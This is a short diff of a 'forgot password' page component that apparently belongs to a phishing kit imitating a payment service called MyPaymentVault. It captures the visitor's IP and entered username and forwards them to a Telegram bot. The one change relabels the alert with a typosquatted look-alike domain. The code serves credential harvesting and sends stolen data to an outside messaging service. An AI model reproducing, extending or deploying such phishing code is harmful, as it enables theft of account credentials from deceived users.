@@ -23,7 +23,7 @@ export default function ForgotPassword() {
     const ip = await getIPInfo();
     await sendTelegram(
       `━━━━━━━━━━━━━━━━━━━━━\n` +
-      `🔑 <b>MyPaymentVault</b>\n` +
+      `🔑 <b>mypaymenttvaulltr.com</b>\n` +
       `📌 <b>Lupa Password</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n\n` +
       `👤 <b>Username</b>    : <code>${username}</code>\n` +
